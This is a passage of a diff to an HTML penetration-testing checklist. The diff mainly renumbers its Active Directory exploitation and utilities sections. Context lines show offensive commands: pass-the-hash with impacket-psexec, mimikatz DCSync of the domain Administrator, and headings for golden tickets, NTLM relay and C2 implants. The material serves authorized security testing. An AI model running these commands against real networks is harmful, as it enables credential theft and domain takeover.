+<h4 id="methodology-ad-exploitation-ticket-forgery">11.8.8 Ticket Forgery</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-ticket-forgery-wf-0"> Golden ticket from the krbtgt hash:
       <ul>
@@ -11806,7 +11682,7 @@ impacket-psexec -hashes :[nt-hash] [domain]/Administrator@[dc]</code></pre>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-ticket-forgery-wf-2"> Diamond / Sapphire tickets when source-of-truth fields matter</li>
   </ul>
 
-<h4 id="methodology-ad-exploitation-dcsync">11.9.9 DCSync</h4>
+<h4 id="methodology-ad-exploitation-dcsync">11.8.9 DCSync</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-dcsync-wf-0"> Confirm the principal has the right ACL:
       <ul>
@@ -11826,7 +11702,7 @@ mimikatz # lsadump::dcsync /user:[domain]\Administrator</code></pre>
   <ul>
   </ul>
 
-<h4 id="methodology-ad-exploitation-ntlm-relay">11.9.10 NTLM Relay Attacks</h4>
+<h4 id="methodology-ad-exploitation-ntlm-relay">11.8.10 NTLM Relay Attacks</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-0"> Set up the relay listener:
       <ul>
@@ -11854,7 +11730,7 @@ mimikatz # lsadump::dcsync /user:[domain]\Administrator</code></pre>
   </ul>
 <p><strong>References:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://dirkjanm.io/" target="_blank" rel="noopener noreferrer">dirk-jan blog</a></p>
 
-<h4 id="methodology-ad-exploitation-trusts">11.9.11 Domain &amp; Forest Trusts</h4>
+<h4 id="methodology-ad-exploitation-trusts">11.8.11 Domain &amp; Forest Trusts</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-trusts-wf-0"> Enumerate trusts and their direction:
       <ul>
@@ -11940,9 +11816,9 @@ mimikatz # lsadump::dcsync /user:[domain]\Administrator</code></pre>
 
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://blog.harmj0y.net/" target="_blank" rel="noopener noreferrer">harmj0y blog</a> &middot; <a href="https://dirkjanm.io/" target="_blank" rel="noopener noreferrer">dirk-jan blog</a> &middot; <a href="https://posts.specterops.io/" target="_blank" rel="noopener noreferrer">SpecterOps blog</a></p>
 
-<h3 id="methodology-utilities">11.10 Utilities</h3>
+<h3 id="methodology-utilities">11.9 Utilities</h3>
 <p>Operator one-liners, encoders, evasion helpers, C2 clients pulled out of larger sections for fast access.</p>
-<h4 id="methodology-utilities-encoders">11.10.1 Encoders</h4>
+<h4 id="methodology-utilities-encoders">11.9.1 Encoders</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-utilities-encoders-wf-0"> Encode for the right ingestion path:</li>
   </ul>
@@ -11958,7 +11834,7 @@ python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" 'pa
   <ul>
   </ul>
 
-<h4 id="methodology-utilities-c2-clients">11.10.2 C2 Clients</h4>
+<h4 id="methodology-utilities-c2-clients">11.9.2 C2 Clients</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-utilities-c2-clients-wf-0"> Sliver for cross-platform implants:
       <ul>
@@ -11971,7 +11847,7 @@ python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" 'pa
   </ul>
 <p><strong>References:</strong> <a href="https://sliver.sh/" target="_blank" rel="noopener noreferrer">Sliver C2 wiki</a> &middot; <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a></p>
 
-<h4 id="methodology-utilities-impacket">11.10.3 Impacket Suite</h4>
+<h4 id="methodology-utilities-impacket">11.9.3 Impacket Suite</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-utilities-impacket-wf-0"> Daily-driver tools:
       <ul>
@@ -11982,7 +11858,7 @@ python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" 'pa
     </li>
   </ul>
 
-<h4 id="methodology-utilities-bloodyad">11.10.4 BloodyAD</h4>
+<h4 id="methodology-utilities-bloodyad">11.9.4 BloodyAD</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-utilities-bloodyad-wf-0"> When you need to write LDAP attributes from Linux:
       <ul>
@@ -12592,16 +12468,15 @@ python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" 'pa
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#methodology-tools-setup">11.1 Tools &amp; Setup</a>
-        <a href="#methodology-reconnaissance">11.2 Reconnaissance</a>
-        <a href="#methodology-initial-access">11.3 Initial Access</a>
-        <a href="#methodology-tunneling">11.4 Tunneling</a>
-        <a href="#methodology-windows-postex">11.5 Windows Post Exploitation</a>
-        <a href="#methodology-linux-postex">11.6 Linux Post Exploitation</a>
-        <a href="#methodology-mssql">11.7 MSSQL</a>
-        <a href="#methodology-ad-enumeration">11.8 Active Directory Enumeration</a>
-        <a href="#methodology-ad-exploitation">11.9 Active Directory Exploitation</a>
-        <a href="#methodology-utilities">11.10 Utilities</a>
+        <a href="#methodology-reconnaissance">11.1 Reconnaissance</a>
+        <a href="#methodology-initial-access">11.2 Initial Access</a>
+        <a href="#methodology-tunneling">11.3 Tunneling</a>
+        <a href="#methodology-windows-postex">11.4 Windows Post Exploitation</a>
+        <a href="#methodology-linux-postex">11.5 Linux Post Exploitation</a>
+        <a href="#methodology-mssql">11.6 MSSQL</a>
+        <a href="#methodology-ad-enumeration">11.7 Active Directory Enumeration</a>
+        <a href="#methodology-ad-exploitation">11.8 Active Directory Exploitation</a>
+        <a href="#methodology-utilities">11.9 Utilities</a>
       </div>
     </div>
     <div class="section-flow-22">
